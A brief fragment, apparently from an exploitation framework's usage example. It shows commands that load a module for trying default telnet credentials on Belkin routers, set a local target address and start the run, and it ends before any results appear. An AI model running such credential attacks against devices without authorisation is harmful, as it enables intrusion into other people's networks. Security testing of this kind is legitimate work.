...
```
exf > use creds/routers/belkin/telnet_default_creds
exf (Belkin Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (Belkin Router Default Telnet Creds) > run
[*] Running module...
